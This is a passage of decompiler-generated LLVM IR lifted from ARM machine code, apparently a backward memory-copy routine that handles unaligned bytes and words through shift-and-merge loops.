bb147:                                            ; preds = %dec_label_pc_17180
  %v6_17184 = load i32, i32* %r1.global-to-local, align 4
  %v7_17184 = add i32 %v6_17184, -4
  %v8_17184 = inttoptr i32 %v7_17184 to i32*
  %v9_17184 = load i32, i32* %v8_17184, align 4
  store i32 %v9_17184, i32* @r3, align 4
  %v10_17184 = add i32 %v6_17184, -8
  %v11_17184 = inttoptr i32 %v10_17184 to i32*
  %v12_17184 = load i32, i32* %v11_17184, align 4
  store i32 %v12_17184, i32* %r4.global-to-local, align 4
  %v13_17184 = add i32 %v6_17184, -12
  %v14_17184 = inttoptr i32 %v13_17184 to i32*
  %v15_17184 = load i32, i32* %v14_17184, align 4
  store i32 %v15_17184, i32* @ip, align 4
  %v16_17184 = add i32 %v6_17184, -16
  %v17_17184 = inttoptr i32 %v16_17184 to i32*
  %v18_17184 = load i32, i32* %v17_17184, align 4
  store i32 %v18_17184, i32* %lr.global-to-local, align 4
  store i32 %v16_17184, i32* %r1.global-to-local, align 4
  %v7_17188 = add i32 %v6_17188, -16
  %v8_17188 = inttoptr i32 %v7_17188 to i32*
  store i32 %v9_17184, i32* %v8_17188, align 4
  %v10_17188 = add i32 %v6_17188, -12
  %v11_17188 = inttoptr i32 %v10_17188 to i32*
  %v12_17188 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17188, i32* %v11_17188, align 4
  %v13_17188 = add i32 %v6_17188, -8
  %v14_17188 = inttoptr i32 %v13_17188 to i32*
  %v15_17188 = load i32, i32* @ip, align 4
  store i32 %v15_17188, i32* %v14_17188, align 4
  %v16_17188 = add i32 %v6_17188, -4
  %v17_17188 = inttoptr i32 %v16_17188 to i32*
  %v18_17188 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17188, i32* %v17_17188, align 4
  store i32 %v7_17188, i32* %r0.global-to-local, align 4
  %v6_1718c = load i32, i32* %r2.global-to-local, align 4
  %v7_1718c = add i32 %v6_1718c, -16
  store i32 %v7_1718c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17180, %bb147
  %v6_17198 = phi i32 [ %v7_17188, %bb147 ], [ %v6_17188, %dec_label_pc_17180 ]
  %v0_17190 = phi i32 [ %v7_1718c, %bb147 ], [ %v0_17190.pr, %dec_label_pc_17180 ]
  %v4_17190 = add i32 %v0_17190, 20
  store i32 %v4_17190, i32* %r2.global-to-local, align 4
  %v6_17190 = sub i32 0, %v0_17190
  %v7_17190 = and i32 %v4_17190, %v6_17190
  %v8_17190 = icmp slt i32 %v7_17190, 0
  store i1 %v8_17190, i1* %cpsr_v.global-to-local, align 1
  %v9_17190 = icmp slt i32 %v4_17190, 0
  store i1 %v9_17190, i1* %cpsr_n.global-to-local, align 1
  %v10_17190 = icmp eq i32 %v4_17190, 0
  store i1 %v10_17190, i1* %cpsr_z.global-to-local, align 1
  %v5_17194 = icmp slt i32 %v0_17190, -20
  br i1 %v5_17194, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_17194 = load i32, i32* %r1.global-to-local, align 4
  %v7_17194 = add i32 %v6_17194, -4
  %v8_17194 = inttoptr i32 %v7_17194 to i32*
  %v9_17194 = load i32, i32* %v8_17194, align 4
  store i32 %v9_17194, i32* @r3, align 4
  %v10_17194 = add i32 %v6_17194, -8
  %v11_17194 = inttoptr i32 %v10_17194 to i32*
  %v12_17194 = load i32, i32* %v11_17194, align 4
  store i32 %v12_17194, i32* @ip, align 4
  %v13_17194 = add i32 %v6_17194, -12
  %v14_17194 = inttoptr i32 %v13_17194 to i32*
  %v15_17194 = load i32, i32* %v14_17194, align 4
  store i32 %v15_17194, i32* %lr.global-to-local, align 4
  store i32 %v13_17194, i32* %r1.global-to-local, align 4
  %v7_17198 = add i32 %v6_17198, -12
  %v8_17198 = inttoptr i32 %v7_17198 to i32*
  store i32 %v9_17194, i32* %v8_17198, align 4
  %v10_17198 = add i32 %v6_17198, -8
  %v11_17198 = inttoptr i32 %v10_17198 to i32*
  %v12_17198 = load i32, i32* @ip, align 4
  store i32 %v12_17198, i32* %v11_17198, align 4
  %v13_17198 = add i32 %v6_17198, -4
  %v14_17198 = inttoptr i32 %v13_17198 to i32*
  %v15_17198 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17198, i32* %v14_17198, align 4
  store i32 %v7_17198, i32* %r0.global-to-local, align 4
  %v6_1719c = load i32, i32* %r2.global-to-local, align 4
  %v7_1719c = add i32 %v6_1719c, -12
  store i32 %v7_1719c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_171bc45 = phi i32 [ %v6_17198, %.thread2 ], [ %v7_17198, %bb148 ]
  %v0_171a443 = phi i32 [ %v4_17190, %.thread2 ], [ %v7_1719c, %bb148 ]
  %v2_171a0 = load i8*, i8** %stack_var_-8, align 4
  %v3_171a0 = ptrtoint i8* %v2_171a0 to i32
  store i32 %v3_171a0, i32* @r4, align 4
  store i32 %v8_1715c, i32* @lr, align 4
  br label %dec_label_pc_171a4

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17154, %.thread4
  %v7_171b4 = phi i32 [ %v0_1716c37, %dec_label_pc_17154 ], [ %v6_171bc45, %.thread4 ]
  %v0_171a4 = phi i32 [ %v2_17154, %dec_label_pc_17154 ], [ %v0_171a443, %.thread4 ]
  %v2_171a4 = add i32 %v0_171a4, 8
  store i32 %v2_171a4, i32* %r2.global-to-local, align 4
  %v4_171a4 = sub i32 0, %v0_171a4
  %v5_171a4 = and i32 %v2_171a4, %v4_171a4
  %v6_171a4 = icmp slt i32 %v5_171a4, 0
  store i1 %v6_171a4, i1* %cpsr_v.global-to-local, align 1
  %v7_171a4 = icmp slt i32 %v2_171a4, 0
  store i1 %v7_171a4, i1* %cpsr_n.global-to-local, align 1
  %v8_171a4 = icmp eq i32 %v2_171a4, 0
  store i1 %v8_171a4, i1* %cpsr_z.global-to-local, align 1
  %v5_171a8 = icmp slt i32 %v0_171a4, -8
  br i1 %v5_171a8, label %bb150, label %dec_label_pc_171ac

dec_label_pc_171ac:                               ; preds = %dec_label_pc_171a4
  %v6_171ac = add i32 %v0_171a4, 4
  store i32 %v6_171ac, i32* %r2.global-to-local, align 4
  %v8_171ac = sub i32 -5, %v0_171a4
  %v9_171ac = and i32 %v8_171ac, %v2_171a4
  %v10_171ac = icmp slt i32 %v9_171ac, 0
  store i1 %v10_171ac, i1* %cpsr_v.global-to-local, align 1
  %v11_171ac = icmp slt i32 %v6_171ac, 0
  store i1 %v11_171ac, i1* %cpsr_n.global-to-local, align 1
  %v12_171ac = icmp eq i32 %v2_171a4, 4
  store i1 %v12_171ac, i1* %cpsr_z.global-to-local, align 1
  %v5_171b0 = icmp slt i32 %v2_171a4, 4
  %v6_171b0 = load i32, i32* %r1.global-to-local, align 4
  %v7_171b0 = add i32 %v6_171b0, -4
  %v8_171b0 = inttoptr i32 %v7_171b0 to i32*
  %v9_171b0 = load i32, i32* %v8_171b0, align 4
  store i32 %v9_171b0, i32* @r3, align 4
  br i1 %v5_171b0, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_171ac
  store i32 %v7_171b0, i32* %r1.global-to-local, align 4
  %v8_171b4 = add i32 %v7_171b4, -4
  %v9_171b4 = inttoptr i32 %v8_171b4 to i32*
  store i32 %v9_171b0, i32* %v9_171b4, align 4
  %v10_171b4 = load i32, i32* %r0.global-to-local, align 4
  %v11_171b4 = add i32 %v10_171b4, -4
  store i32 %v11_171b4, i32* %r0.global-to-local, align 4
  %v0_171c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_171ac
  %v10_171b8 = add i32 %v6_171b0, -8
  %v11_171b8 = inttoptr i32 %v10_171b8 to i32*
  %v12_171b8 = load i32, i32* %v11_171b8, align 4
  store i32 %v12_171b8, i32* @ip, align 4
  store i32 %v10_171b8, i32* %r1.global-to-local, align 4
  %v7_171bc = add i32 %v7_171b4, -8
  %v8_171bc = inttoptr i32 %v7_171bc to i32*
  store i32 %v9_171b0, i32* %v8_171bc, align 4
  %v10_171bc = add i32 %v7_171b4, -4
  %v11_171bc = inttoptr i32 %v10_171bc to i32*
  %v12_171bc = load i32, i32* @ip, align 4
  store i32 %v12_171bc, i32* %v11_171bc, align 4
  store i32 %v7_171bc, i32* %r0.global-to-local, align 4
  %v6_171c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_171c0 = add i32 %v6_171c0, -4
  store i32 %v7_171c0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_171a4, %dec_label_pc_17134, %dec_label_pc_17368, %dec_label_pc_172fc, %dec_label_pc_17290, %bb149
  %v2_171c8 = phi i32 [ %v11_171b4, %.thread8 ], [ %v0_1726020, %.thread14 ], [ %v7_171b4, %dec_label_pc_171a4 ], [ %v2_17138, %dec_label_pc_17134 ], [ %v2_171d453, %dec_label_pc_17368 ], [ %v2_171d452, %dec_label_pc_172fc ], [ %v2_171d451, %dec_label_pc_17290 ], [ %v7_171bc, %bb149 ]
  %v0_171c4 = phi i32 [ %v0_171c4.pre, %.thread8 ], [ %v2_17208, %.thread14 ], [ %v2_171a4, %dec_label_pc_171a4 ], [ %v2_1713c, %dec_label_pc_17134 ], [ %v0_171c449, %dec_label_pc_17368 ], [ %v0_171c448, %dec_label_pc_172fc ], [ %v0_171c447, %dec_label_pc_17290 ], [ %v7_171c0, %bb149 ]
  %v1_171c4 = add i32 %v0_171c4, 4
  store i32 %v1_171c4, i32* %r2.global-to-local, align 4
  %v3_171c4 = sub i32 0, %v0_171c4
  %v4_171c4 = and i32 %v1_171c4, %v3_171c4
  %v5_171c4 = icmp slt i32 %v4_171c4, 0
  store i1 %v5_171c4, i1* %cpsr_v.global-to-local, align 1
  %v6_171c4 = icmp slt i32 %v1_171c4, 0
  store i1 %v6_171c4, i1* %cpsr_n.global-to-local, align 1
  %v7_171c4 = icmp eq i32 %v1_171c4, 0
  store i1 %v7_171c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_171c4, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_171cc = add i32 %v0_171c4, 2
  %v3_171cc = sub i32 -3, %v0_171c4
  %v4_171cc = and i32 %v3_171cc, %v1_171c4
  %v5_171cc = icmp slt i32 %v4_171cc, 0
  store i1 %v5_171cc, i1* %cpsr_v.global-to-local, align 1
  %v6_171cc = icmp slt i32 %v1_171cc, 0
  store i1 %v6_171cc, i1* %cpsr_n.global-to-local, align 1
  %v7_171cc = icmp eq i32 %v1_171c4, 2
  store i1 %v7_171cc, i1* %cpsr_z.global-to-local, align 1
  %v0_171d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_171d0 = add i32 %v0_171d0, -1
  %v2_171d0 = inttoptr i32 %v1_171d0 to i8*
  %v3_171d0 = load i8, i8* %v2_171d0, align 1
  %v4_171d0 = zext i8 %v3_171d0 to i32
  store i32 %v4_171d0, i32* @r3, align 4
  store i32 %v1_171d0, i32* %r1.global-to-local, align 4
  %v3_171d4 = add i32 %v2_171c8, -1
  %v4_171d4 = inttoptr i32 %v3_171d4 to i8*
  store i8 %v3_171d0, i8* %v4_171d4, align 1
  %v5_171d4 = load i32, i32* %r0.global-to-local, align 4
  %v6_171d4 = add i32 %v5_171d4, -1
  store i32 %v6_171d4, i32* %r0.global-to-local, align 4
  %v0_171d8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_171d8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_171d8 = xor i1 %v0_171d8, %v1_171d8
  br i1 %v2_171d8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_171d8 = load i32, i32* %r1.global-to-local, align 4
  %v4_171d8 = add i32 %v3_171d8, -1
  %v5_171d8 = inttoptr i32 %v4_171d8 to i8*
  %v6_171d8 = load i8, i8* %v5_171d8, align 1
  %v7_171d8 = zext i8 %v6_171d8 to i32
  store i32 %v7_171d8, i32* @r3, align 4
  store i32 %v4_171d8, i32* %r1.global-to-local, align 4
  %v6_171dc = add i32 %v5_171d4, -2
  %v7_171dc = inttoptr i32 %v6_171dc to i8*
  store i8 %v6_171d8, i8* %v7_171dc, align 1
  %v8_171dc = load i32, i32* %r0.global-to-local, align 4
  %v9_171dc = add i32 %v8_171dc, -1
  store i32 %v9_171dc, i32* %r0.global-to-local, align 4
  %v1_171e0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_171e0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_171e4 = phi i32 [ %v9_171dc, %bb152 ], [ %v6_171d4, %bb151 ]
  %v2_171e4 = phi i1 [ %v2_171e0.pre, %bb152 ], [ %v1_171d8, %bb151 ]
  %v1_171e4 = phi i1 [ %v1_171e0.pre, %bb152 ], [ %v0_171d8, %bb151 ]
  %v0_171e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_171e0 = xor i1 %v2_171e4, %v1_171e4
  %v4_171e0 = or i1 %v0_171e0, %v3_171e0
  br i1 %v4_171e0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_171e0 = load i32, i32* %r1.global-to-local, align 4
  %v6_171e0 = add i32 %v5_171e0, -1
  %v7_171e0 = inttoptr i32 %v6_171e0 to i8*
  %v8_171e0 = load i8, i8* %v7_171e0, align 1
  %v9_171e0 = zext i8 %v8_171e0 to i32
  store i32 %v9_171e0, i32* @r3, align 4
  store i32 %v6_171e0, i32* %r1.global-to-local, align 4
  %v8_171e4 = add i32 %v7_171e4, -1
  %v9_171e4 = inttoptr i32 %v8_171e4 to i8*
  store i8 %v8_171e0, i8* %v9_171e4, align 1
  %v10_171e4 = load i32, i32* %r0.global-to-local, align 4
  %v11_171e4 = add i32 %v10_171e4, -1
  store i32 %v11_171e4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_171ec:                               ; preds = %dec_label_pc_17144
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_171ec = icmp eq i32 %v1_17144, 1
  store i1 %v8_171ec, i1* %cpsr_n.global-to-local, align 1
  %v9_171ec = icmp eq i32 %v1_17144, 2
  store i1 %v9_171ec, i1* %cpsr_z.global-to-local, align 1
  %v1_171f0 = add i32 %v2_17134, -1
  %v2_171f0 = inttoptr i32 %v1_171f0 to i8*
  %v3_171f0 = load i8, i8* %v2_171f0, align 1
  %v4_171f0 = zext i8 %v3_171f0 to i32
  store i32 %v4_171f0, i32* @r3, align 4
  store i32 %v1_171f0, i32* %r1.global-to-local, align 4
  %v3_171f4 = add i32 %v2_17138, -1
  %v4_171f4 = inttoptr i32 %v3_171f4 to i8*
  store i8 %v3_171f0, i8* %v4_171f4, align 1
  %v5_171f4 = load i32, i32* %r0.global-to-local, align 4
  %v6_171f4 = add i32 %v5_171f4, -1
  store i32 %v6_171f4, i32* %r0.global-to-local, align 4
  br i1 %v8_171ec, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_171ec
  %v6_171f8 = load i32, i32* %r1.global-to-local, align 4
  %v7_171f8 = add i32 %v6_171f8, -1
  %v8_171f8 = inttoptr i32 %v7_171f8 to i8*
  %v9_171f8 = load i8, i8* %v8_171f8, align 1
  %v10_171f8 = zext i8 %v9_171f8 to i32
  store i32 %v10_171f8, i32* @r3, align 4
  store i32 %v7_171f8, i32* %r1.global-to-local, align 4
  %v9_171fc = add i32 %v5_171f4, -2
  %v10_171fc = inttoptr i32 %v9_171fc to i8*
  store i8 %v9_171f8, i8* %v10_171fc, align 1
  %v11_171fc = load i32, i32* %r0.global-to-local, align 4
  %v12_171fc = add i32 %v11_171fc, -1
  store i32 %v12_171fc, i32* %r0.global-to-local, align 4
  br i1 %v9_171ec, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_17200 = load i32, i32* %r1.global-to-local, align 4
  %v9_17200 = add i32 %v8_17200, -1
  %v10_17200 = inttoptr i32 %v9_17200 to i8*
  %v11_17200 = load i8, i8* %v10_17200, align 1
  %v12_17200 = zext i8 %v11_17200 to i32
  store i32 %v12_17200, i32* @r3, align 4
  store i32 %v9_17200, i32* %r1.global-to-local, align 4
  %v11_17204 = add i32 %v11_171fc, -2
  %v12_17204 = inttoptr i32 %v11_17204 to i8*
  store i8 %v11_17200, i8* %v12_17204, align 1
  %v13_17204 = load i32, i32* %r0.global-to-local, align 4
  %v14_17204 = add i32 %v13_17204, -1
  store i32 %v14_17204, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_171ec, %bb155
  %v0_1726020 = phi i32 [ %v12_171fc, %bb154 ], [ %v6_171f4, %dec_label_pc_171ec ], [ %v14_17204, %bb155 ]
  %v0_17208 = load i32, i32* %r2.global-to-local, align 4
  %v1_17208 = load i32, i32* @ip, align 4
  %v2_17208 = sub i32 %v0_17208, %v1_17208
  store i32 %v2_17208, i32* %r2.global-to-local, align 4
  %v4_17208 = xor i32 %v1_17208, %v0_17208
  %v5_17208 = xor i32 %v2_17208, %v0_17208
  %v6_17208 = and i32 %v5_17208, %v4_17208
  %v7_17208 = icmp slt i32 %v6_17208, 0
  store i1 %v7_17208, i1* %cpsr_v.global-to-local, align 1
  %v8_17208 = icmp slt i32 %v2_17208, 0
  store i1 %v8_17208, i1* %cpsr_n.global-to-local, align 1
  %v9_17208 = icmp eq i32 %v0_17208, %v1_17208
  store i1 %v9_17208, i1* %cpsr_z.global-to-local, align 1
  %v5_1720c = icmp slt i32 %v0_17208, %v1_17208
  br i1 %v5_1720c, label %bb150, label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %.thread14
  %v0_17210 = load i32, i32* %r1.global-to-local, align 4
  %v1_17210 = urem i32 %v0_17210, 4
  store i32 %v1_17210, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17210 = icmp eq i32 %v1_17210, 0
  store i1 %v2_17210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17210, label %dec_label_pc_17154, label %dec_label_pc_17218

dec_label_pc_17218:                               ; preds = %dec_label_pc_1714c, %dec_label_pc_17210
  %v0_1726019 = phi i32 [ %v2_17138, %dec_label_pc_1714c ], [ %v0_1726020, %dec_label_pc_17210 ]
  %v0_1730c = phi i32 [ %v2_1713c, %dec_label_pc_1714c ], [ %v2_17208, %dec_label_pc_17210 ]
  %v0_17218 = phi i32 [ %v2_17134, %dec_label_pc_1714c ], [ %v0_17210, %dec_label_pc_17210 ]
  %v0_17220 = phi i32 [ %v1_1714c, %dec_label_pc_1714c ], [ %v1_17210, %dec_label_pc_17210 ]
  %v1_17218 = and i32 %v0_17218, -4
  store i32 %v1_17218, i32* %r1.global-to-local, align 4
  %v1_1721c = inttoptr i32 %v1_17218 to i32*
  %v2_1721c = load i32, i32* %v1_1721c, align 4
  store i32 %v2_1721c, i32* @r3, align 4
  %v7_17220 = icmp ult i32 %v0_17220, 2
  %v2_17304 = add i32 %v0_1730c, -12
  %v4_17304 = sub i32 11, %v0_1730c
  %v5_17304 = and i32 %v4_17304, %v0_1730c
  %v6_17304 = icmp slt i32 %v5_17304, 0
  store i1 %v6_17304, i1* %cpsr_v.global-to-local, align 1
  %v7_17304 = icmp slt i32 %v2_17304, 0
  store i1 %v7_17304, i1* %cpsr_n.global-to-local, align 1
  %v8_17304 = icmp eq i32 %v0_1730c, 12
  store i1 %v8_17304, i1* %cpsr_z.global-to-local, align 1
  %v5_17308 = icmp slt i32 %v0_1730c, 12
  br i1 %v7_17220, label %dec_label_pc_17304, label %dec_label_pc_17228

dec_label_pc_17228:                               ; preds = %dec_label_pc_17218
  %v8_17220 = icmp eq i32 %v0_17220, 2
  br i1 %v8_17220, label %dec_label_pc_17298, label %dec_label_pc_1722c

dec_label_pc_1722c:                               ; preds = %dec_label_pc_17228
  br i1 %v5_17308, label %dec_label_pc_17278, label %dec_label_pc_17234

dec_label_pc_17234:                               ; preds = %dec_label_pc_1722c
  store i32 %v2_17304, i32* %r2.global-to-local, align 4
  %v3_17238 = load i32, i32* @r4, align 4
  store i32 %v3_17238, i32* %stack_var_-12, align 4
  %v6_17238 = load i32, i32* @r5, align 4
  %v8_17238 = inttoptr i32 %v6_17238 to i8*
  store i8* %v8_17238, i8** %stack_var_-8, align 4
  %v11_17238 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1723c

dec_label_pc_1723c:                               ; preds = %dec_label_pc_1723c.dec_label_pc_1723c_crit_edge, %dec_label_pc_17234
  %v0_17260 = phi i32 [ %v1_17260, %dec_label_pc_1723c.dec_label_pc_1723c_crit_edge ], [ %v0_1726019, %dec_label_pc_17234 ]
  %v0_17240 = phi i32 [ %v0_17240.pre, %dec_label_pc_1723c.dec_label_pc_1723c_crit_edge ], [ %v1_17218, %dec_label_pc_17234 ]
  %v0_1723c = phi i32 [ %v0_1723c.pre, %dec_label_pc_1723c.dec_label_pc_1723c_crit_edge ], [ %v2_1721c, %dec_label_pc_17234 ]
  %v3_1723c = mul i32 %v0_1723c, 256
  store i32 %v3_1723c, i32* %lr.global-to-local, align 4
  %v1_17240 = add i32 %v0_17240, -4
  %v2_17240 = inttoptr i32 %v1_17240 to i32*
  %v3_17240 = load i32, i32* %v2_17240, align 4
  store i32 %v3_17240, i32* @r3, align 4
  %v4_17240 = add i32 %v0_17240, -8
  %v5_17240 = inttoptr i32 %v4_17240 to i32*
  %v6_17240 = load i32, i32* %v5_17240, align 4
  store i32 %v6_17240, i32* %r4.global-to-local, align 4
  %v7_17240 = add i32 %v0_17240, -12
  %v8_17240 = inttoptr i32 %v7_17240 to i32*
  %v9_17240 = load i32, i32* %v8_17240, align 4
  store i32 %v9_17240, i32* %r5.global-to-local, align 4
  %v10_17240 = add i32 %v0_17240, -16
  %v11_17240 = inttoptr i32 %v10_17240 to i32*
  %v12_17240 = load i32, i32* %v11_17240, align 4
  store i32 %v10_17240, i32* %r1.global-to-local, align 4
  %v4_17244 = udiv i32 %v12_17240, 16777216
  %v5_17244 = or i32 %v4_17244, %v3_1723c
  store i32 %v5_17244, i32* %lr.global-to-local, align 4
  %v3_17248 = mul i32 %v12_17240, 256
  %v4_1724c = udiv i32 %v9_17240, 16777216
  %v5_1724c = or i32 %v3_17248, %v4_1724c
  store i32 %v5_1724c, i32* @ip, align 4
  %v3_17250 = mul i32 %v9_17240, 256
  %v4_17254 = udiv i32 %v6_17240, 16777216
  %v5_17254 = or i32 %v3_17250, %v4_17254
  store i32 %v5_17254, i32* %r5.global-to-local, align 4
  %v3_17258 = mul i32 %v6_17240, 256
  %v4_1725c = udiv i32 %v3_17240, 16777216
  %v5_1725c = or i32 %v3_17258, %v4_1725c
  store i32 %v5_1725c, i32* %r4.global-to-local, align 4
  %v1_17260 = add i32 %v0_17260, -16
  %v2_17260 = inttoptr i32 %v1_17260 to i32*
  store i32 %v5_1725c, i32* %v2_17260, align 4
  %v4_17260 = add i32 %v0_17260, -12
  %v5_17260 = inttoptr i32 %v4_17260 to i32*
  %v6_17260 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17260, i32* %v5_17260, align 4
  %v7_17260 = add i32 %v0_17260, -8
  %v8_17260 = inttoptr i32 %v7_17260 to i32*
  %v9_17260 = load i32, i32* @ip, align 4
  store i32 %v9_17260, i32* %v8_17260, align 4
  %v10_17260 = add i32 %v0_17260, -4
  %v11_17260 = inttoptr i32 %v10_17260 to i32*
  %v12_17260 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17260, i32* %v11_17260, align 4
  store i32 %v1_17260, i32* %r0.global-to-local, align 4
  %v0_17264 = load i32, i32* %r2.global-to-local, align 4
  %v2_17264 = add i32 %v0_17264, -16
  store i32 %v2_17264, i32* %r2.global-to-local, align 4
  %v6_17268 = icmp slt i32 %v0_17264, 16
  br i1 %v6_17268, label %dec_label_pc_1726c, label %dec_label_pc_1723c.dec_label_pc_1723c_crit_edge

dec_label_pc_1723c.dec_label_pc_1723c_crit_edge:  ; preds = %dec_label_pc_1723c
  %v0_1723c.pre = load i32, i32* @r3, align 4
  %v0_17240.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1723c

dec_label_pc_1726c:                               ; preds = %dec_label_pc_1723c
  %v2_1726c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1726c, i32* @r4, align 4
  %v5_1726c = load i8*, i8** %stack_var_-8, align 4
  %v6_1726c = ptrtoint i8* %v5_1726c to i32
  store i32 %v6_1726c, i32* @r5, align 4
  store i32 %v11_17238, i32* @lr, align 4
  %v2_17270 = add i32 %v0_17264, -4
  store i32 %v2_17270, i32* %r2.global-to-local, align 4
  %v4_17270 = add i32 %v0_17264, 2147483632
  %v5_17270 = and i32 %v2_17270, %v4_17270
  %v6_17270 = icmp slt i32 %v5_17270, 0
  store i1 %v6_17270, i1* %cpsr_v.global-to-local, align 1
  %v7_17270 = icmp slt i32 %v2_17270, 0
  store i1 %v7_17270, i1* %cpsr_n.global-to-local, align 1
  %v8_17270 = icmp eq i32 %v2_17270, 0
  store i1 %v8_17270, i1* %cpsr_z.global-to-local, align 1
  %v5_17274 = icmp slt i32 %v2_17264, -12
  br i1 %v5_17274, label %dec_label_pc_17290, label %dec_label_pc_17278

dec_label_pc_17278:                               ; preds = %dec_label_pc_1726c, %dec_label_pc_1722c, %dec_label_pc_17278
  %v1_17284 = phi i32 [ %v5_17284, %dec_label_pc_17278 ], [ %v1_17260, %dec_label_pc_1726c ], [ %v0_1726019, %dec_label_pc_1722c ]
  %v0_17278 = load i32, i32* @r3, align 4
  %v3_17278 = mul i32 %v0_17278, 256
  store i32 %v3_17278, i32* %ip.global-to-local, align 4
  %v0_1727c = load i32, i32* %r1.global-to-local, align 4
  %v1_1727c = add i32 %v0_1727c, -4
  %v2_1727c = inttoptr i32 %v1_1727c to i32*
  %v3_1727c = load i32, i32* %v2_1727c, align 4
  store i32 %v3_1727c, i32* @r3, align 4
  store i32 %v1_1727c, i32* %r1.global-to-local, align 4
  %v4_17280 = udiv i32 %v3_1727c, 16777216
  %v5_17280 = or i32 %v4_17280, %v3_17278
  store i32 %v5_17280, i32* @ip, align 4
  %v2_17284 = add i32 %v1_17284, -4
  %v3_17284 = inttoptr i32 %v2_17284 to i32*
  store i32 %v5_17280, i32* %v3_17284, align 4
  %v4_17284 = load i32, i32* %r0.global-to-local, align 4
  %v5_17284 = add i32 %v4_17284, -4
  store i32 %v5_17284, i32* %r0.global-to-local, align 4
  %v0_17288 = load i32, i32* %r2.global-to-local, align 4
  %v2_17288 = add i32 %v0_17288, -4
  store i32 %v2_17288, i32* %r2.global-to-local, align 4
  %v6_1728c = icmp slt i32 %v0_17288, 4
  br i1 %v6_1728c, label %dec_label_pc_17290.loopexit, label %dec_label_pc_17278

dec_label_pc_17290.loopexit:                      ; preds = %dec_label_pc_17278
  %v4_17288 = sub i32 3, %v0_17288
  %v5_17288 = and i32 %v4_17288, %v0_17288
  %v6_17288 = icmp slt i32 %v5_17288, 0
  %v7_17288 = icmp slt i32 %v2_17288, 0
  store i1 %v6_17288, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17288, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17290

dec_label_pc_17290:                               ; preds = %dec_label_pc_17290.loopexit, %dec_label_pc_1726c
  %v2_171d451 = phi i32 [ %v5_17284, %dec_label_pc_17290.loopexit ], [ %v1_17260, %dec_label_pc_1726c ]
  %v0_171c447 = phi i32 [ %v2_17288, %dec_label_pc_17290.loopexit ], [ %v2_17270, %dec_label_pc_1726c ]
  %v0_17290 = load i32, i32* %r1.global-to-local, align 4
  %v1_17290 = add i32 %v0_17290, 3
  store i32 %v1_17290, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17298:                               ; preds = %dec_label_pc_17228
  br i1 %v5_17308, label %dec_label_pc_172e4, label %dec_label_pc_172a0

dec_label_pc_172a0:                               ; preds = %dec_label_pc_17298
  store i32 %v2_17304, i32* %r2.global-to-local, align 4
  %v3_172a4 = load i32, i32* @r4, align 4
  store i32 %v3_172a4, i32* %stack_var_-12, align 4
  %v6_172a4 = load i32, i32* @r5, align 4
  %v8_172a4 = inttoptr i32 %v6_172a4 to i8*
  store i8* %v8_172a4, i8** %stack_var_-8, align 4
  %v11_172a4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_172a8

dec_label_pc_172a8:                               ; preds = %dec_label_pc_172a8.dec_label_pc_172a8_crit_edge, %dec_label_pc_172a0
  %v0_172cc = phi i32 [ %v1_172cc, %dec_label_pc_172a8.dec_label_pc_172a8_crit_edge ], [ %v0_1726019, %dec_label_pc_172a0 ]
  %v0_172ac = phi i32 [ %v0_172ac.pre, %dec_label_pc_172a8.dec_label_pc_172a8_crit_edge ], [ %v1_17218, %dec_label_pc_172a0 ]
  %v0_172a8 = phi i32 [ %v0_172a8.pre, %dec_label_pc_172a8.dec_label_pc_172a8_crit_edge ], [ %v2_1721c, %dec_label_pc_172a0 ]
  %v3_172a8 = mul i32 %v0_172a8, 65536
  store i32 %v3_172a8, i32* %lr.global-to-local, align 4
  %v1_172ac = add i32 %v0_172ac, -4
  %v2_172ac = inttoptr i32 %v1_172ac to i32*
  %v3_172ac = load i32, i32* %v2_172ac, align 4
  store i32 %v3_172ac, i32* @r3, align 4
  %v4_172ac = add i32 %v0_172ac, -8
  %v5_172ac = inttoptr i32 %v4_172ac to i32*
  %v6_172ac = load i32, i32* %v5_172ac, align 4
  store i32 %v6_172ac, i32* %r4.global-to-local, align 4
  %v7_172ac = add i32 %v0_172ac, -12
